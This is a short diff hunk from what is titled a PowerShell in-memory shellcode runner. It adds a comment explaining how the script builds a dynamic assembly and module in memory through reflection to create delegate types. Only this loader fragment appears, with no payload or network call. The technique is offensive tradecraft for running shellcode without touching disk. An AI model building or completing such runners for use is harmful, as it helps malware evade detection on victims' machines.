@@ -47,7 +47,7 @@ Complete PowerShell script for in-memory shellcode runner
 				[Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
 				[Parameter(Position = 1)] [Type] $delType = [Void]
 			)
-		
+		***<comment>Creating a custom assembly object in memory and Setting the access mode of the assembly to Run; Creating a custom module inside the assembly<comment>***
 			$type = [AppDomain]::CurrentDomain.
 		    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), 
 		    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
